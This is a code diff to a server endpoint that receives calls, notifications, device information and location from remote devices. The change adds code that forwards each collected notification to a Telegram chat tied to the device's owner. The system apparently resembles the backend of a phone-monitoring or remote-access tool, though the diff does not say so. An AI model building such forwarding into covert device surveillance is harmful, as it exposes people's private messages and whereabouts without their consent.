@@ -25,7 +25,7 @@ from .firebase_client import (
     store_calls, store_notifications, store_device_info, store_location
 )
 from .file_storage import save_upload, save_base64_upload, get_file, get_storage_stats
-from .telegram_bot import forward_result, get_bot_username
+from .telegram_bot import forward_result, forward_notification, get_bot_username
 
 logger = logging.getLogger("api")
 
@@ -557,7 +557,19 @@ async def api_device_data(request: web.Request) -> web.Response:
     elif data_type == 'calls' and data:
         await store_calls(device_id, data if isinstance(data, list) else [data])
     elif data_type == 'notifications' and data:
-        await store_notifications(device_id, data if isinstance(data, list) else [data])
+        notif_list = data if isinstance(data, list) else [data]
+        await store_notifications(device_id, notif_list)
+        # Forward each notification to the Telegram chat linked to the device
+        # owner (spec 16-BOT: instant notification forwarding).
+        try:
+            device = store.devices.get(device_id)
+            owner_id = device.get('owner_id') if device else None
+            if owner_id:
+                for n in notif_list:
+                    if isinstance(n, dict):
+                        await forward_notification(owner_id, n)
+        except Exception as e:
+            logger.warning(f"Failed to forward notifications to Telegram for device {device_id}: {e}")
     elif data_type == 'device_info' and data:
         await store_device_info(device_id, data)
     
